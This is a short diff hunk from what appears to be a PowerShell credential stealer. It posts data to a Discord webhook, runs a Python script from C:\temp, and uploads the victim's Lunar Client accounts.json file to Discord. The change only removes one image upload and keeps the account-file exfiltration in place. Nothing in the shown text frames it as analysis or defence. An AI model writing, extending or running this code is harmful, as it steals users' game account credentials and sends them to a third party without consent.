@@ -154,7 +154,7 @@ $payload = [PSCustomObject]@{
 
 Invoke-RestMethod -Uri $webHookUrl -Body ($payload | ConvertTo-Json -Depth 4) -Method Post -ContentType 'application/json'
 python C:\temp\UUID.py
-Upload-Discord -file "C:\temp\MicrosoftPolicy.png"
+
 Upload-Discord -file "C:\Users\$env:UserName\.lunarclient\settings\game\accounts.json"
 
 Upload-Discord -text "---------------------------------------------------------------------------------------------------------------------------------------------------------"
